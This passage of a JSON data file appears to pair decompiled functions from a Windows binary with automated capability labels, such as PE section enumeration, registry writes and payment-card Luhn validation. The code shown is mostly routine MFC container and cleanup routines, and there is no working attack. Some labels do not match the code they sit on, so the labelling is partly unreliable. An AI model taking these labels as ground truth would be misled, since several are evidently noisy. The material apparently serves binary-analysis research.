        "decompiled_code": "\nint32_t * __thiscall fcn.0040cde0(int32_t *param_1, char *param_2)\n\n{\n    char cVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x43b4a8;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    piVar2 = fcn.004308e7();\n    iVar3 = (**(*piVar2 + 0xc))();\n    *param_1 = iVar3 + 0x10;\n    uStack4 = 0;\n    if (param_2 == NULL) {\n        iVar3 = 0;\n    }\n    else {\n        if ((param_2 & 0xffff0000) == 0) {\n            iVar3 = fcn.0043085a(param_2 & 0xffff);\n            if (iVar3 != 0) {\n                fcn.00402790(iVar3, param_2 & 0xffff);\n                *in_FS_OFFSET = unaff_EDI;\n                return param_1;\n            }\n            goto code_r0x0040ce72;\n        }\n        pcVar4 = param_2;\n        do {\n            cVar1 = *pcVar4;\n            pcVar4 = pcVar4 + 1;\n        } while (cVar1 != '\\0');\n        iVar3 = pcVar4 - (param_2 + 1);\n    }\n    fcn.00402860(param_2, iVar3);\ncode_r0x0040ce72:\n    *in_FS_OFFSET = unaff_ESI;\n    return param_1;\n}\n",
        "token_count": 418
    },
    "0040d690": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "create or open registry key",
            "set registry value"
        ],
        "decompiled_code": "\nvoid fcn.0040d690(uint param_1, int32_t param_2)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    bool bVar5;\n    uint uVar6;\n    uint uVar7;\n    uint *puStack20;\n    uint *puStack16;\n    uint uStack4;\n    \n    iVar3 = param_2;\n    puStack16 = &param_2;\n    puStack20 = &uStack4;\n    uVar7 = 0;\n    uStack4 = 0;\n    (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)(param_1, param_2, 0, 0, 0, 0xf003f);\n    uVar6 = 0;\n    (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(uVar7, 0, 0, 4, &puStack20, 4);\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(uVar6);\n    ppiVar1 = iVar3 + -0x10;\n    piVar2 = iVar3 + -4;\n    LOCK();\n    iVar3 = *piVar2;\n    *piVar2 = *piVar2 + -1;\n    if (iVar3 + -1 < 1) {\n        (**(**ppiVar1 + 4))(ppiVar1);\n    }\n    LOCK();\n    iVar3 = *0xfffffffc + -1;\n    iVar4 = *0xfffffffc + -1;\n    bVar5 = *0xfffffffc == 1;\n    *0xfffffffc = iVar3;\n    if (bVar5 || iVar4 < 0) {\n        (**(**0xfffffff0 + 4))(0xfffffff0);\n    }\n    return;\n}\n",
        "token_count": 403
    },
    "0040d720": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "create or open registry key",
            "set registry value"
        ],
        "decompiled_code": "\n// WARNING: Heritage AFTER dead removal. Example location: s0x00000008 : 0x0040d7a9\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid fcn.0040d720(int32_t param_1, int32_t param_2)\n\n{\n    int32_t **ppiVar1;\n    int32_t iVar2;\n    int32_t unaff_EBX;\n    uint uVar3;\n    uint uVar4;\n    uchar auStack20 [4];\n    int32_t *piVar5;\n    uint uStack4;\n    \n    iVar2 = param_2;\n    uVar4 = 0;\n    uStack4 = 0;\n    (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)(param_1, param_2, 0, 0, 0, 0xf003f, 0);\n    uVar3 = 1;\n    (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(uVar4, &uStack4, 0, 1, &param_2, uStack4);\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(uVar3);\n    ppiVar1 = iVar2 + -0x10;\n    piVar5 = iVar2 + -4;\n    LOCK();\n    iVar2 = *piVar5;\n    *piVar5 = *piVar5 + -1;\n    if (iVar2 + -1 < 1) {\n        (**(**ppiVar1 + 4))(ppiVar1);\n    }\n    LOCK();\n    piVar5 = unaff_EBX + -1;\n    if (unaff_EBX + -1 < 1) {\n        (**(param_2 + 4))(auStack20);\n    }\n    LOCK();\n    if (param_1 == 1 || param_1 + -1 < 0) {\n        (**(*piVar5 + 4))(&stack0xfffffff8);\n    }\n    return;\n}\n",
        "token_count": 433
    },
    "0040da50": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __thiscall fcn.0040da50(uint param_1, int16_t *param_2)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    \n    piVar2 = fcn.00418bd9(param_1);\n    if (piVar2 == NULL) {\n        return 0;\n    }\n    *param_2 = piVar2[10] + 0x76c;\n    param_2[1] = piVar2[8] + 1;\n    param_2[2] = piVar2[0xc];\n    param_2[3] = piVar2[6];\n    param_2[4] = piVar2[4];\n    param_2[5] = piVar2[2];\n    iVar1 = *piVar2;\n    param_2[6] = iVar1;\n    param_2[7] = 0;\n    return CONCAT31(piVar2 >> 8 & 0xffff00 | iVar1 >> 8, 1);\n}\n",
        "token_count": 227
    },
    "0040e97c": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040e97c(int32_t arg_8h, uint32_t *arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint32_t pvParam;\n    uint32_t uStack16;\n    uint32_t uStack12;\n    uint32_t uStack8;\n    \n    iVar2 = fcn.0040e7cb();\n    if (iVar2 == 0) {\n        if ((((arg_8h == 0x12340042) && (arg_ch != NULL)) && (0x27 < *arg_ch)) &&\n           (iVar2 = (*_sym.imp.USER32.dll_SystemParametersInfoA)(0x30, 0, &pvParam, 0),  iVar2 != 0)) {\n            arg_ch[1] = 0;\n            arg_ch[2] = 0;\n            pcVar1 = _sym.imp.USER32.dll_GetSystemMetrics;\n            uVar4 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0);\n            arg_ch[3] = uVar4;\n            uVar4 = (*pcVar1)(1);\n            arg_ch[5] = pvParam;\n            arg_ch[6] = uStack16;\n            arg_ch[7] = uStack12;\n            arg_ch[8] = uStack8;\n            uVar3 = 1;\n            arg_ch[4] = uVar4;\n            arg_ch[9] = 1;\n            if (0x47 < *arg_ch) {\n                (*_sym.imp.KERNEL32.dll_lstrcpynA)(arg_ch + 10, \"DISPLAY\", 0x20);\n            }\n        }\n        else {\n            uVar3 = 0;\n        }\n    }\n    else {\n        uVar3 = (**0x450108)(arg_8h, arg_ch);\n    }\n    return uVar3;\n}\n",
        "token_count": 422
    },
    "0042a1c1": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042a1c1(int32_t param_1)\n\n{\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 8) = 0;\n    *(param_1 + 4) = 0;\n    fcn.0042a3e7();\n    *(param_1 + 0x14) = 0;\n    return;\n}\n",
        "token_count": 106
    },
    "00411644": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00411644(uint *arg_8h, uint arg_ch, uint32_t arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, int32_t arg_28h, int32_t arg_2ch, uint arg_30h)\n\n{\n    arg_8h[8] = (arg_10h & 0xffff) >> 0xe & 1;\n    arg_8h[5] = arg_30h;\n    arg_8h[9] = arg_20h;\n    *(arg_8h + 0xc) = arg_10h;\n    *arg_8h = arg_ch;\n    *(arg_8h + 0x32) = arg_18h;\n    arg_8h[1] = arg_24h;\n    *(arg_8h + 0x33) = arg_1ch;\n    arg_8h[7] = 1;\n    arg_8h[10] = arg_14h;\n    arg_8h[0xb] = 0;\n    arg_8h[2] = 0;\n    arg_8h[3] = 0;\n    arg_8h[4] = 0;\n    arg_8h[6] = 0;\n    if (arg_28h != 0) {\n        arg_8h[7] = 3;\n        arg_8h[2] = arg_28h;\n    }\n    if (arg_2ch != 0) {\n        arg_8h[7] = arg_8h[7] | 4;\n        arg_8h[3] = arg_2ch;\n    }\n    return;\n}\n",
        "token_count": 395
    },
    "004116bf": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004116bf(uint *param_1, uint param_2, uint param_3)\n\n{\n    param_1[8] = param_2;\n    *param_1 = 0;\n    param_1[1] = 0;\n    param_1[2] = 0;\n    param_1[3] = 0;\n    param_1[5] = 0;\n    param_1[6] = 0;\n    param_1[9] = param_3;\n    param_1[4] = 0;\n    return;\n}\n",
        "token_count": 131
    },
    "004116e8": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004116e8(int32_t param_1)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = _sym.imp.ole32.dll_CoTaskMemFree;\n    (*_sym.imp.ole32.dll_CoTaskMemFree)(*(param_1 + 0x14));\n    *(param_1 + 0x14) = 0;\n    (*pcVar1)(*(param_1 + 0x18));\n    *(param_1 + 0x18) = 0;\n    fcn.0042f834(*(param_1 + 8));\n    *(param_1 + 8) = 0;\n    fcn.0042f834(*(param_1 + 0x10));\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 0xc) = 0;\n    return;\n}\n",
        "token_count": 196
    },
    "00411724": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00411724(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, int32_t arg_28h, int32_t arg_2ch, uint arg_30h, uint arg_34h, uint arg_38h)\n\n{\n    arg_8h[8] = arg_34h;\n    arg_8h[5] = arg_30h;\n    arg_8h[9] = arg_20h;\n    *arg_8h = arg_ch;\n    *(arg_8h + 0xc) = arg_10h;\n    *(arg_8h + 0x32) = arg_18h;\n    *(arg_8h + 0x33) = arg_1ch;\n    arg_8h[0xb] = 0;\n    arg_8h[1] = 0;\n    arg_8h[2] = 0;\n    arg_8h[3] = 0;\n    arg_8h[4] = 0;\n    arg_8h[6] = 0;\n    arg_8h[10] = arg_14h;\n    arg_8h[7] = 0;\n    if (arg_38h == '\\0') {\n        arg_8h[7] = 1;\n        arg_8h[1] = arg_24h;\n    }\n    if (arg_28h != 0) {\n        arg_8h[7] = arg_8h[7] | 2;\n        arg_8h[2] = arg_28h;\n    }\n    if (arg_2ch != 0) {\n        arg_8h[7] = arg_8h[7] | 4;\n        arg_8h[3] = arg_2ch;\n    }\n    return;\n}\n",
        "token_count": 438
    },
    "004118de": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl\nfcn.004118de(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint arg_8h, uint arg_ch, \n            uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    uVar3 = *(unaff_EBP + 0xc);\n    uVar1 = *(unaff_EBP + 0x10);\n    iVar2 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = &stack0xffffffec;\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    *(extraout_ECX + 8) = uVar3;\n    *(extraout_ECX + 0x18) = uVar1;\n    *(extraout_ECX + 0x10) = iVar2;\n    *(extraout_ECX + 0x14) = 0;\n    fcn.004192e0(uVar3, 0, uVar1);\n    fcn.0042f834(*(extraout_ECX + 0xc));\n    *(extraout_ECX + 0xc) = 0;\n    *(unaff_EBP + -4) = 0;\n    uVar3 = fcn.0042f804(iVar2 * 0x34);\n    *(extraout_ECX + 0xc) = uVar3;\n    iVar2 = *(extraout_ECX + 0xc);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return (-(iVar2 != 0) & 0x7ff8fff2) + 0x8007000e;\n}\n",
        "token_count": 478
    },
    "00412954": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251"
        ],
        "decompiled_code": "\ncode ** __thiscall fcn.00412954(code **param_1, code *param_2)\n\n{\n    *param_1 = vtable.CDataSourceControl.0;\n    param_1[1] = param_2;\n    param_1[2] = NULL;\n    param_1[3] = NULL;\n    param_1[4] = NULL;\n    param_1[5] = NULL;\n    fcn.0042a286(10);\n    param_1[0xd] = NULL;\n    param_1[0xe] = NULL;\n    param_1[0xf] = NULL;\n    param_1[0x10] = NULL;\n    param_1[0x11] = NULL;\n    param_1[0x12] = NULL;\n    param_1[0x13] = NULL;\n    param_1[0x14] = NULL;\n    param_1[0x15] = NULL;\n    param_1[0x16] = NULL;\n    return param_1;\n}\n",
        "token_count": 226
    },
    "0041599a": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_a0h\n// WARNING: Variable defined which should be unmapped: var_9ch\n// WARNING: Variable defined which should be unmapped: var_94h\n// WARNING: Variable defined which should be unmapped: var_98h\n\nvoid fcn.0041599a(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint *puVar5;\n    int32_t *extraout_ECX;\n    int32_t **ppiVar6;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint pv;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    *(unaff_EBP + -0x10) = *0x44d270;\n    *(unaff_EBP + -0x88) = extraout_ECX[5];\n    iVar2 = extraout_ECX[0x12];\n    *(unaff_EBP + -0x80) = extraout_ECX[4];\n    if (iVar2 == 0) {\n        piVar1 = extraout_ECX[2];\n        if ((piVar1 == NULL) ||\n           (iVar2 = (**(*piVar1 + 0xc))(piVar1, 0x443c1c, unaff_EBP + -0x78, unaff_EBP + -0x7c),  iVar2 < 0))\n        goto code_r0x00415cea;\n        fcn.00412a0d(unaff_EBP + -0x70, 0x444338);\n        *(unaff_EBP + -0x50) = 0xffffffff;\n        *(unaff_EBP + -0x58) = 0;\n        *(unaff_EBP + -0x54) = 0;\n        *(unaff_EBP + -0x4c) = 0x18;\n        *(unaff_EBP + -0x48) = 0;\n        *(unaff_EBP + -0x44) = 0x1fb;\n        fcn.00412a0d(unaff_EBP + -0x40, 0x444320);\n        *(unaff_EBP + -0x20) = 0xffffffff;\n        *(unaff_EBP + -0x28) = 0x1c;\n        *(unaff_EBP + -0x24) = 0;\n        *(unaff_EBP + -0x1c) = 0x20;\n        *(unaff_EBP + -0x18) = 0;\n        *(unaff_EBP + -0x14) = 0x1e;\n        iVar2 = (**(**(unaff_EBP + -0x78) + 0x10))(*(unaff_EBP + -0x78), 2, unaff_EBP + -0x70, 0x28, 0);\n        if (iVar2 < 0) {\n            (**(**(unaff_EBP + -0x78) + 8))(*(unaff_EBP + -0x78));\n            goto code_r0x00415cea;\n        }\n        *(unaff_EBP + -0xa0) = *(unaff_EBP + -0x7c);\n        *(unaff_EBP + -0x9c) = 1;\n        *(unaff_EBP + -0x98) = 0;\n        *(unaff_EBP + -0x94) = 0;\n        *(unaff_EBP + -0x90) = 0;\n        iVar2 = (**(**(unaff_EBP + -0x78) + 0x18))(*(unaff_EBP + -0x78), 0, 0, unaff_EBP + -0xa0);\n        *(unaff_EBP + -0x84) = iVar2;\n        if (iVar2 < 0) {\n            (**(**(unaff_EBP + -0x78) + 8))(*(unaff_EBP + -0x78));\n            goto code_r0x00415cea;\n        }\n        iVar2 = *(unaff_EBP + -0x94);\n        extraout_ECX[5] = *(unaff_EBP + -0x98);\n        *(unaff_EBP + -0x7c) = *(unaff_EBP + -0x8c);\n        extraout_ECX[4] = *(unaff_EBP + -0x8c);\n        piVar1 = *(unaff_EBP + -0x78);\n        extraout_ECX[0xd] = iVar2;\n        (**(*piVar1 + 8))(piVar1);\n    }\n    else {\n        iVar2 = (**(*extraout_ECX[0x13] + 0x14))(extraout_ECX[0x13], 0x443e1c, unaff_EBP + -0x74);\n        *(unaff_EBP + -0x84) = iVar2;\n        if (iVar2 < 0) goto code_r0x00415cea;\n        iVar2 = (****(unaff_EBP + -0x74))(*(unaff_EBP + -0x74), 0x443dfc, unaff_EBP + -0x7c);\n        if (-1 < iVar2) {\n            *(unaff_EBP + -0x78) = 0;\n            iVar2 = (**(**(unaff_EBP + -0x7c) + 0x10))(*(unaff_EBP + -0x7c), 0x443f3c, unaff_EBP + -0x78);\n            if (-1 < iVar2) {\n                (**(**(unaff_EBP + -0x78) + 0x14))(*(unaff_EBP + -0x78), extraout_ECX[1] + 0xe4, extraout_ECX + 0x16);\n                (**(**(unaff_EBP + -0x78) + 8))(*(unaff_EBP + -0x78));\n            }\n            (**(**(unaff_EBP + -0x7c) + 8))(*(unaff_EBP + -0x7c));\n        }\n        iVar2 = fcn.0042f804(0x14);\n        if (iVar2 == 0) {\n            iVar2 = 0;\n        }\n        else {\n            iVar2 = fcn.004148b4(*(unaff_EBP + -0x74));\n        }\n        extraout_ECX[0x14] = iVar2;\n        (**(**(unaff_EBP + -0x74) + 8))(*(unaff_EBP + -0x74));\n        iVar2 = *extraout_ECX[0x14];\n        if (iVar2 != 0) {\n            fcn.00412c8b(iVar2, extraout_ECX[0x14] + 1);\n        }\n        iVar2 = fcn.0042f804(0x28);\n        if (iVar2 == 0) {\n            iVar2 = 0;\n        }\n        else {\n            iVar2 = fcn.004116bf(0, 8000);\n        }\n        extraout_ECX[0x15] = iVar2;\n        fcn.004153ca(*extraout_ECX[0x14]);\n        *(extraout_ECX[0x14] + 8) = extraout_ECX[0x15];\n        iVar2 = *(extraout_ECX[0x15] + 0xc);\n        extraout_ECX[4] = iVar2;\n        iVar2 = (*_sym.imp.ole32.dll_CoTaskMemAlloc)(iVar2 * 0x28);\n        extraout_ECX[5] = iVar2;\n        fcn.004192e0(iVar2, 0, extraout_ECX[4] * 0x28);\n        fcn.004152b4();\n        fcn.00412c48();\n    }\n    iVar2 = extraout_ECX[4];\n    *(unaff_EBP + -0x74) = 0;\n    if (0 < iVar2) {\n        iVar2 = 0;\n        do {\n            iVar3 = fcn.0042f804(0x1c);\n            *(unaff_EBP + -0x7c) = iVar3;\n            *(unaff_EBP + -4) = 0;\n            if (iVar3 == 0) {\n                uVar4 = 0;\n            }\n            else {\n                uVar4 = fcn.0042a286(0x1c, 10);\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            iVar3 = extraout_ECX[5];\n            *(unaff_EBP + -0x74) = *(unaff_EBP + -0x74) + 1;\n            *(iVar2 + 0x24 + iVar3) = uVar4;\n            iVar2 = iVar2 + 0x28;\n        } while (*(unaff_EBP + -0x74) < extraout_ECX[4]);\n    }\n    if (*(unaff_EBP + -0x88) != 0) {\n        if (0 < *(unaff_EBP + -0x80)) {\n            ppiVar6 = *(unaff_EBP + -0x88) + 0x24;\n            *(unaff_EBP + -0x74) = *(unaff_EBP + -0x80);\n            *(unaff_EBP + -0x7c) = -0x24 - *(unaff_EBP + -0x88);\n            do {\n                iVar2 = (*ppiVar6)[1];\n                *(unaff_EBP + -0x80) = iVar2;\n                while (iVar2 != 0) {\n                    puVar5 = fcn.0040e765(unaff_EBP + -0x80);\n                    (**(*extraout_ECX + 8))(*puVar5, 1);\n                    iVar2 = *(unaff_EBP + -0x80);\n                }\n                fcn.0042a1c1();\n                if (*ppiVar6 != NULL) {\n                    (**(**ppiVar6 + 4))(1);\n                }\n                ppiVar6 = ppiVar6 + 10;\n                piVar1 = unaff_EBP + -0x74;\n                *piVar1 = *piVar1 + -1;\n            } while (*piVar1 != 0);\n        }\n        (*_sym.imp.ole32.dll_CoTaskMemFree)(*(unaff_EBP + -0x88));\n    }\ncode_r0x00415cea:\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 2560
    },
    "004270cf": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004270cf(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = fcn.0042f804(4);\n    if (iVar1 == 0) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = fcn.004289ef();\n    }\n    *(param_1 + 0x24) = uVar2;\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x10) = 0x201;\n    *(param_1 + 0x14) = 6;\n    *(param_1 + 0x18) = 0;\n    *(param_1 + 0x1c) = 0;\n    *(param_1 + 0x20) = 0;\n    fcn.00426fae(0, 0);\n    return;\n}\n",
        "token_count": 209
    },
    "00428873": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\ncode ** __cdecl fcn.00428873(uint arg_8h)\n\n{\n    uchar uVar1;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    extraout_ECX[1] = 0x1;\n    *(unaff_EBP + -4) = 0;\n    extraout_ECX[2] = NULL;\n    extraout_ECX[3] = NULL;\n    extraout_ECX[4] = NULL;\n    uVar1 = *(unaff_EBP + 8);\n    *extraout_ECX = vtable.std::locale::_Locimp.0;\n    *(extraout_ECX + 5) = uVar1;\n    fcn.00407250(0x4445a0);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return extraout_ECX;\n}\n",
        "token_count": 257
    },
    "00429b37": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00429b37(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    *(param_1 + 0xc) = 1;\n    iVar1 = fcn.0043080f(*(param_1 + 0x94), param_1 + 0x14, 0x80);\n    *(param_1 + 0x10) = iVar1 != 0;\n    return;\n}\n",
        "token_count": 98
    },
    "0042a286": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0042a286(code **param_1, code *param_2)\n\n{\n    param_1[3] = NULL;\n    param_1[4] = NULL;\n    param_1[2] = NULL;\n    param_1[1] = NULL;\n    param_1[5] = NULL;\n    *param_1 = vtable.CPtrList.0;\n    param_1[6] = param_2;\n    return;\n}\n",
        "token_count": 105
    },
    "0042a60e": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042a60e(int32_t param_1)\n\n{\n    if (*(param_1 + 4) != 0) {\n        fcn.0042f834(*(param_1 + 4));\n        *(param_1 + 4) = 0;\n    }\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x10) = 0;\n    fcn.0042a3e7();\n    *(param_1 + 0x14) = 0;\n    return;\n}\n",
        "token_count": 125
    },
    "0042a77e": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0042a77e(code **param_1, code *param_2)\n\n{\n    *param_1 = vtable.CMapPtrToPtr.0;\n    if (param_2 < 1) {\n        param_2 = 0xa;\n    }\n    param_1[1] = NULL;\n    param_1[2] = 0x11;\n    param_1[3] = NULL;\n    param_1[4] = NULL;\n    param_1[5] = NULL;\n    param_1[6] = param_2;\n    return;\n}\n",
        "token_count": 133
    },
    "0042a894": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0042a894(code **param_1, code *param_2)\n\n{\n    *param_1 = vtable.CMapStringToPtr.0;\n    if (param_2 < 1) {\n        param_2 = 0xa;\n    }\n    param_1[1] = NULL;\n    param_1[2] = 0x11;\n    param_1[3] = NULL;\n    param_1[4] = NULL;\n    param_1[5] = NULL;\n    param_1[6] = param_2;\n    return;\n}\n",
        "token_count": 132
    },
    "0042a91b": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "contain loop"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.0042a91b(int32_t param_1, uint32_t *param_2, uint32_t *param_3)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint unaff_retaddr;\n    \n    uVar2 = fcn.0042a873(param_2);\n    *param_3 = uVar2;\n    uVar2 = uVar2 % *(param_1 + 8);\n    *param_2 = uVar2;\n    if (*(param_1 + 4) != 0) {\n        for (puVar3 = *(*(param_1 + 4) + uVar2 * 4); puVar3 != NULL; puVar3 = *puVar3) {\n            if ((puVar3[1] == *param_3) && (cVar1 = fcn.00437040(puVar3 + 2, unaff_retaddr),  cVar1 != '\\0')) {\n                return puVar3;\n            }\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 241
    },
    "0042aa10": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042aa10(code **param_1)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    \n    *param_1 = vtable.CMapStringToPtr.0;\n    if (param_1[1] != NULL) {\n        pcVar1 = NULL;\n        if (param_1[2] != NULL) {\n            do {\n                for (puVar2 = *(param_1[1] + pcVar1 * 4); puVar2 != NULL; puVar2 = *puVar2) {\n                    fcn.004020d0();\n                }\n                pcVar1 = pcVar1 + 1;\n            } while (pcVar1 < param_1[2]);\n        }\n        fcn.0042f834(param_1[1]);\n        param_1[1] = NULL;\n    }\n    param_1[3] = NULL;\n    param_1[4] = NULL;\n    fcn.0042a3e7();\n    param_1[5] = NULL;\n    return;\n}\n",
        "token_count": 233
    },
    "0042f302": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042f302(int32_t param_1)\n\n{\n    *(param_1 + 4) = 1;\n    *(param_1 + 8) = 0;\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 0x14) = 1;\n    *(param_1 + 0x18) = 0;\n    return;\n}\n",
        "token_count": 108
    },
    "0042f5ae": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042f5ae(code **param_1)\n\n{\n    *param_1 = vtable.CCmdUI.0;\n    param_1[8] = NULL;\n    param_1[2] = NULL;\n    param_1[1] = NULL;\n    param_1[9] = NULL;\n    param_1[4] = NULL;\n    param_1[3] = NULL;\n    param_1[5] = NULL;\n    param_1[7] = NULL;\n    param_1[6] = NULL;\n    return;\n}\n",
        "token_count": 127
    },
    "0043272b": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
